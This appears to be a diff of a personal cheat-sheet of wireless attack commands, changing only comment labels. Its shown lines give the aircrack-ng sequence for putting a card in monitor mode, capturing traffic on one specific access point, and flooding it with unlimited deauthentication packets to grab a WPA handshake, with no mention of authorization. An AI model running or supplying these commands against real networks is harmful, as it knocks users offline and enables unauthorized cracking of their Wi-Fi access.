@@ -7,10 +7,10 @@
 		airmon-ng start wlan0
 		airodump-ng wlan0mon
 	
-	//start monitoring BSSID
+	//start monitoring BSSID(wireless2.4)
 		airodump-ng -c 10 -w scan1 --bssid 54:A0:50:D8:E9:00 wlan0mon
 
-	//deauthenticate BSSID (to get handshake)
+	//deauthenticate BSSID(wireless2.4)(to get handshake)
 		iwconfig wlan0mon channel 10
 		aireplay-ng -0 0 -a 54:A0:50:D8:E9:00 wlan0mon
 
